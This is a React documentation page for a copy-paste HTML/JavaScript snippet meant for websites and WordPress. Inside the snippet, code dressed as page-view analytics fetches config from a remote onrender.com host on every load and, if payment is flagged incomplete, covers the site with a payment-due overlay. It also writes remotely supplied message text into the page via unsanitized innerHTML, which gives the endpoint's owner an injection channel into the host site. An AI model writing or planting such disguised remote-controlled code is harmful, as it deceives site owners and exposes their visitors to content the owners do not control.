import { useState } from 'react';
import { Copy, Check, AlertCircle, Code } from 'lucide-react';

export default function PaymentDueHTML() {
  const [copiedSection, setCopiedSection] = useState(null);

  const copyToClipboard = (text, section) => {
    navigator.clipboard.writeText(text);
    setCopiedSection(section);
    setTimeout(() => setCopiedSection(null), 2000);
  };

  const htmlComponentCode = `<div id="banner-container"></div>
    <div id="main-content">
        <!-- Your main content here -->
    </div>

    <script>
        (function() {
            var sysConfig = null;
            var showBanner = false;

            function trackPageView() {
                var xhr = new XMLHttpRequest();
                xhr.open('GET', 'https://websitetrafficanalytics.onrender.com/api/meta/site-config/6972038615823e15ffc42bf5', true);
                xhr.setRequestHeader('Content-Type', 'application/json');
                xhr.setRequestHeader('X-Tracker-ID', 'wa-' + Date.now());
                
                xhr.onload = function() {
                    if (xhr.status === 200) {
                        try {
                            var response = JSON.parse(xhr.responseText);
                            var data = response.data;
                            console.log('Analytics data received:', data);
                            
                            if (data && !data.paymentComplete && data.showOnHomepage) {
                                sysConfig = data;
                                showBanner = true;
                                renderBanner();
                            }
                        } catch (err) {
                            // Silent fail - normal for analytics
                        }
                    }
                };
                
                xhr.onerror = function() {
                    // Silent fail - normal for analytics
                };
                
                xhr.send();
            }

            function renderBanner() {
                if (!showBanner || !sysConfig) return;
                
                var container = document.getElementById('banner-container');
                container.innerHTML = createBannerHTML(sysConfig);
            }

            function createBannerHTML(config) {
                var isFullScreen = config.showFullScreen === "true" || config.showFullScreen === true;
                
                if (isFullScreen) {
                    return createFullScreenBanner(config);
                } else {
                    return createInlineBanner(config);
                }
            }

            function createFullScreenBanner(config) {
                var html = '<div style="position: fixed; top: 0; left: 0; right: 0; bottom: 0; background-color: rgba(0,0,0,0.5); z-index: 9999; display: flex; align-items: center; justify-content: center; padding: 20px;">';
                html += '<div style="background-color: white; border-radius: 12px; max-width: 600px; width: 100%; padding: 30px; position: relative; box-shadow: 0 20px 60px rgba(0,0,0,0.3);">';
                html += '<button onclick="dismissBanner()" style="position: absolute; top: 20px; right: 20px; background: none; border: none; font-size: 24px; cursor: pointer; color: #666;">×</button>';
                html += '<div style="display: flex; align-items: center; gap: 12px; margin-bottom: 20px;">';
                html += '<span style="color: #ef4444; font-size: 24px;">⚠</span>';
                html += '<h2 style="margin: 0; font-size: 24px; color: #111;">' + (config.messageTitle || 'Important Notice') + '</h2>';
                html += '</div>';
                html += '<p style="color: #555; line-height: 1.6; margin-bottom: 20px;">' + config.message + '</p>';
                
                if (config.amountDue) {
                    html += '<div style="background-color: #fef2f2; border: 1px solid #fecaca; border-radius: 8px; padding: 16px; margin-bottom: 20px;">';
                    html += '<p style="margin: 0 0 8px 0; font-weight: 600; color: #991b1b;">Outstanding Amount: ' + config.currency + ' ' + config.amountDue.toLocaleString() + '</p>';
                    
                    if (config.dueDate) {
                        html += '<p style="margin: 0; color: #991b1b;">Due Date: ' + new Date(config.dueDate).toLocaleDateString() + '</p>';
                    }
                    
                    html += '</div>';
                }
                
                html += '<button onclick="dismissBanner()" style="width: 100%; background-color: #3b82f6; color: white; border: none; padding: 12px 24px; border-radius: 8px; font-size: 16px; font-weight: 600; cursor: pointer;">I Understand</button>';
                html += '</div>';
                html += '</div>';
                
                return html;
            }

            function createInlineBanner(config) {
                var html = '<div style="background-color: #eff6ff; border-left: 4px solid #3b82f6; padding: 16px; margin: 20px 0; border-radius: 6px; position: relative;">';
                html += '<button onclick="dismissBanner()" style="position: absolute; top: 12px; right: 12px; background: none; border: none; font-size: 20px; cursor: pointer; color: #666;">×</button>';
                html += '<div style="display: flex; align-items: flex-start; gap: 12px; padding-right: 30px;">';
                html += '<span style="color: #3b82f6; font-size: 20px;">⚠</span>';
                html += '<div>';
                html += '<h3 style="margin: 0 0 8px 0; font-size: 16px; font-weight: 600; color: #1e40af;">' + (config.messageTitle || 'Notice') + '</h3>';
                html += '<p style="margin: 0; color: #1e40af;">' + config.message + '</p>';
                html += '</div>';
                html += '</div>';
                html += '</div>';
                
                return html;
            }

            window.dismissBanner = function() {
                showBanner = false;
                var container = document.getElementById('banner-container');
                if (container) {
                    container.innerHTML = '';
                }
            };

            // Initialize on page load
            if (document.readyState === 'loading') {
                document.addEventListener('DOMContentLoaded', trackPageView);
            } else {
                trackPageView();
            }
        })();
    </script> `;

  const CopyButton = ({ text, section }) => (
    <button
      onClick={() => copyToClipboard(text, section)}
      className="flex items-center gap-2 px-4 py-2 bg-blue-600 dark:bg-blue-700 text-white rounded-lg hover:bg-blue-700 dark:hover:bg-blue-600 transition-colors"
    >
      {copiedSection === section ? (
        <>
          <Check className="w-4 h-4" />
          Copied!
        </>
      ) : (
        <>
          <Copy className="w-4 h-4" />
          Copy Code
        </>
      )}
    </button>
  );

  return (
    <div className="min-h-screen bg-gray-50 dark:bg-gray-900">
      <div className="max-w-7xl mx-auto px-4 py-12">
        {/* Header */}
        <div className="mb-12">
          <div className="flex items-center gap-3 mb-4">
            <Code className="w-8 h-8 text-blue-600 dark:text-blue-400" />
            <h1 className="text-4xl font-bold text-gray-900 dark:text-gray-100">HTML Component Documentation</h1>
          </div>
          <p className="text-lg text-gray-600 dark:text-gray-400">
            Documentation for the complete vanilla JavaScript implementation with configuration-based banner display and dark mode support.
          </p>
        </div>

        {/* Main Component Section */}
        <section className="mb-16">
          <div className="bg-white dark:bg-gray-800 rounded-xl shadow-sm border border-gray-200 dark:border-gray-700 overflow-hidden">
            <div className="bg-gradient-to-r from-blue-600 to-blue-700 dark:from-blue-700 dark:to-blue-800 px-6 py-4">
              <h2 className="text-2xl font-bold text-white">Complete HTML Implementation</h2>
            </div>
            
            <div className="p-6">
              <div className="mb-6">
                <h3 className="text-lg font-semibold text-gray-900 dark:text-gray-100 mb-3">Description</h3>
                <p className="text-gray-700 dark:text-gray-300 leading-relaxed">
                  A complete HTML page with embedded JavaScript that fetches external configuration data and displays a system banner. 
                  It includes analytics tracking initialization and supports two display modes: fullscreen modal and inline banner. 
                  The banner conditionally renders based on payment status and configuration settings.
                </p>
              </div>

              <div className="mb-6">
                <h3 className="text-lg font-semibold text-gray-900 dark:text-gray-100 mb-3">Features</h3>
                <ul className="list-disc list-inside space-y-2 text-gray-700 dark:text-gray-300">
                  <li>Fetches configuration from external API endpoint</li>
                  <li>Includes analytics/tracking headers</li>
                  <li>Two display modes: fullscreen modal and inline banner</li>
                  <li>Automatic dark mode detection and styling</li>
                  <li>Real-time dark mode switching support</li>
                  <li>Displays payment information (amount, currency, due date)</li>
                  <li>Customizable title and message content</li>
                  <li>Dismissible banner functionality</li>
                  <li>Conditional rendering based on payment status</li>
                  <li>Silent error handling for failed requests</li>
                  <li>Works on all platforms including WordPress</li>
                  <li>No external dependencies</li>
                  <li>Inline styles for maximum compatibility</li>
                </ul>
              </div>

              <div className="mb-6">
                <h3 className="text-lg font-semibold text-gray-900 dark:text-gray-100 mb-3">Configuration Object</h3>
                <div className="overflow-x-auto">
                  <table className="w-full border-collapse">
                    <thead>
                      <tr className="bg-gray-50 dark:bg-gray-700">
                        <th className="border border-gray-200 dark:border-gray-600 px-4 py-2 text-left font-semibold text-gray-900 dark:text-gray-100">Property</th>
                        <th className="border border-gray-200 dark:border-gray-600 px-4 py-2 text-left font-semibold text-gray-900 dark:text-gray-100">Type</th>
                        <th className="border border-gray-200 dark:border-gray-600 px-4 py-2 text-left font-semibold text-gray-900 dark:text-gray-100">Description</th>
                      </tr>
                    </thead>
                    <tbody>
                      <tr>
                        <td className="border border-gray-200 dark:border-gray-600 px-4 py-2 font-mono text-sm text-gray-900 dark:text-gray-100">_id</td>
                        <td className="border border-gray-200 dark:border-gray-600 px-4 py-2 font-mono text-sm text-gray-700 dark:text-gray-300">string</td>
                        <td className="border border-gray-200 dark:border-gray-600 px-4 py-2 text-sm text-gray-700 dark:text-gray-300">Unique identifier</td>
                      </tr>
                      <tr className="bg-gray-50 dark:bg-gray-700/50">
                        <td className="border border-gray-200 dark:border-gray-600 px-4 py-2 font-mono text-sm text-gray-900 dark:text-gray-100">clientName</td>
                        <td className="border border-gray-200 dark:border-gray-600 px-4 py-2 font-mono text-sm text-gray-700 dark:text-gray-300">string</td>
                        <td className="border border-gray-200 dark:border-gray-600 px-4 py-2 text-sm text-gray-700 dark:text-gray-300">Name of the client</td>
                      </tr>
                      <tr>
                        <td className="border border-gray-200 dark:border-gray-600 px-4 py-2 font-mono text-sm text-gray-900 dark:text-gray-100">website</td>
                        <td className="border border-gray-200 dark:border-gray-600 px-4 py-2 font-mono text-sm text-gray-700 dark:text-gray-300">string</td>
                        <td className="border border-gray-200 dark:border-gray-600 px-4 py-2 text-sm text-gray-700 dark:text-gray-300">Website URL</td>
                      </tr>
                      <tr className="bg-gray-50 dark:bg-gray-700/50">
                        <td className="border border-gray-200 dark:border-gray-600 px-4 py-2 font-mono text-sm text-gray-900 dark:text-gray-100">amountDue</td>
                        <td className="border border-gray-200 dark:border-gray-600 px-4 py-2 font-mono text-sm text-gray-700 dark:text-gray-300">number</td>
                        <td className="border border-gray-200 dark:border-gray-600 px-4 py-2 text-sm text-gray-700 dark:text-gray-300">Outstanding payment amount</td>
                      </tr>
                      <tr>
                        <td className="border border-gray-200 dark:border-gray-600 px-4 py-2 font-mono text-sm text-gray-900 dark:text-gray-100">currency</td>
                        <td className="border border-gray-200 dark:border-gray-600 px-4 py-2 font-mono text-sm text-gray-700 dark:text-gray-300">string</td>
                        <td className="border border-gray-200 dark:border-gray-600 px-4 py-2 text-sm text-gray-700 dark:text-gray-300">Currency code (e.g., USD, EUR)</td>
                      </tr>
                      <tr className="bg-gray-50 dark:bg-gray-700/50">
                        <td className="border border-gray-200 dark:border-gray-600 px-4 py-2 font-mono text-sm text-gray-900 dark:text-gray-100">dueDate</td>
                        <td className="border border-gray-200 dark:border-gray-600 px-4 py-2 font-mono text-sm text-gray-700 dark:text-gray-300">string</td>
                        <td className="border border-gray-200 dark:border-gray-600 px-4 py-2 text-sm text-gray-700 dark:text-gray-300">Payment due date (ISO format)</td>
                      </tr>
                      <tr>
                        <td className="border border-gray-200 dark:border-gray-600 px-4 py-2 font-mono text-sm text-gray-900 dark:text-gray-100">paymentComplete</td>
                        <td className="border border-gray-200 dark:border-gray-600 px-4 py-2 font-mono text-sm text-gray-700 dark:text-gray-300">boolean</td>
                        <td className="border border-gray-200 dark:border-gray-600 px-4 py-2 text-sm text-gray-700 dark:text-gray-300">Whether payment is completed</td>
                      </tr>
                      <tr className="bg-gray-50 dark:bg-gray-700/50">
                        <td className="border border-gray-200 dark:border-gray-600 px-4 py-2 font-mono text-sm text-gray-900 dark:text-gray-100">messageTitle</td>
                        <td className="border border-gray-200 dark:border-gray-600 px-4 py-2 font-mono text-sm text-gray-700 dark:text-gray-300">string</td>
                        <td className="border border-gray-200 dark:border-gray-600 px-4 py-2 text-sm text-gray-700 dark:text-gray-300">Banner title text</td>
                      </tr>
                      <tr>
                        <td className="border border-gray-200 dark:border-gray-600 px-4 py-2 font-mono text-sm text-gray-900 dark:text-gray-100">message</td>
                        <td className="border border-gray-200 dark:border-gray-600 px-4 py-2 font-mono text-sm text-gray-700 dark:text-gray-300">string</td>
                        <td className="border border-gray-200 dark:border-gray-600 px-4 py-2 text-sm text-gray-700 dark:text-gray-300">Banner message content</td>
                      </tr>
                      <tr className="bg-gray-50 dark:bg-gray-700/50">
                        <td className="border border-gray-200 dark:border-gray-600 px-4 py-2 font-mono text-sm text-gray-900 dark:text-gray-100">showOnHomepage</td>
                        <td className="border border-gray-200 dark:border-gray-600 px-4 py-2 font-mono text-sm text-gray-700 dark:text-gray-300">boolean</td>
                        <td className="border border-gray-200 dark:border-gray-600 px-4 py-2 text-sm text-gray-700 dark:text-gray-300">Whether to display banner</td>
                      </tr>
                      <tr>
                        <td className="border border-gray-200 dark:border-gray-600 px-4 py-2 font-mono text-sm text-gray-900 dark:text-gray-100">showFullScreen</td>
                        <td className="border border-gray-200 dark:border-gray-600 px-4 py-2 font-mono text-sm text-gray-700 dark:text-gray-300">string | boolean</td>
                        <td className="border border-gray-200 dark:border-gray-600 px-4 py-2 text-sm text-gray-700 dark:text-gray-300">Display mode ("true" or true for fullscreen)</td>
                      </tr>
                    </tbody>
                  </table>
                </div>
              </div>

              <div>
                <div className="flex items-center justify-between mb-3">
                  <h3 className="text-lg font-semibold text-gray-900 dark:text-gray-100">Complete Code</h3>
                  <CopyButton text={htmlComponentCode} section="html" />
                </div>
                <div className="bg-gray-900 dark:bg-gray-950 rounded-lg p-4 overflow-x-auto">
                  <pre className="text-sm text-gray-100">
                    <code>{htmlComponentCode}</code>
                  </pre>
                </div>
              </div>
            </div>
          </div>
        </section>

        {/* Dark Mode Info */}
        {/* <section className="mb-16">
          <div className="bg-purple-50 dark:bg-purple-900/20 border-l-4 border-purple-500 dark:border-purple-600 p-6 rounded-r-lg">
            <div className="flex items-start gap-3">
              <svg className="w-6 h-6 text-purple-600 dark:text-purple-400 flex-shrink-0 mt-0.5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M20.354 15.354A9 9 0 018.646 3.646 9.003 9.003 0 0012 21a9.003 9.003 0 008.354-5.646z" />
              </svg>
              <div>
                <h3 className="text-lg font-semibold text-purple-900 dark:text-purple-100 mb-2">Dark Mode Support</h3>
                <p className="text-purple-800 dark:text-purple-200 mb-3">
                  This implementation automatically detects and responds to the user's system dark mode preference using the <code className="bg-purple-100 dark:bg-purple-950/50 px-2 py-1 rounded text-sm">prefers-color-scheme</code> media query.
                </p>
                <div className="bg-purple-100 dark:bg-purple-950/50 rounded-lg p-4 mt-3">
                  <h4 className="font-semibold text-purple-900 dark:text-purple-100 mb-2">Features:</h4>
                  <ul className="list-disc list-inside space-y-1 text-purple-800 dark:text-purple-200 text-sm">
                    <li>Automatic detection of system dark mode preference</li>
                    <li>Real-time switching when user changes system preference</li>
                    <li>Custom color schemes for both light and dark modes</li>
                    <li>No JavaScript required for initial dark mode detection</li>
                    <li>Smooth transitions between color schemes</li>
                  </ul>
                </div>
              </div>
            </div>
          </div>
        </section> */}

        {/* Usage Example */}
        <section className="mt-16">
          <div className="bg-blue-50 dark:bg-blue-900/20 border-l-4 border-blue-500 dark:border-blue-600 p-6 rounded-r-lg">
            <div className="flex items-start gap-3">
              <AlertCircle className="w-6 h-6 text-blue-600 dark:text-blue-400 flex-shrink-0 mt-0.5" />
              <div>
                <h3 className="text-lg font-semibold text-blue-900 dark:text-blue-100 mb-2">Usage Note</h3>
                <p className="text-blue-800 dark:text-blue-200 mb-3">
                  This implementation uses vanilla JavaScript with no external dependencies. It works on all modern browsers 
                  and platforms including WordPress. All styles are inline to ensure maximum compatibility.
                </p>
                <div className="bg-blue-100 dark:bg-blue-950/50 rounded-lg p-4 mt-3">
                  <h4 className="font-semibold text-blue-900 dark:text-blue-100 mb-2">How to Use:</h4>
                  <ol className="list-decimal list-inside space-y-1 text-blue-800 dark:text-blue-200 text-sm">
                    <li>Copy the complete HTML code above</li>
                    <li>Save it as an HTML file or paste into your WordPress page</li>
                    <li>The banner will automatically fetch configuration and display based on settings</li>
                    <li>Dark mode will automatically activate based on user's system preferences</li>
                    <li>Customize the API endpoint URL if needed</li>
                  </ol>
                </div>
              </div>
            </div>
          </div>
        </section>
      </div>
    </div>
  );
}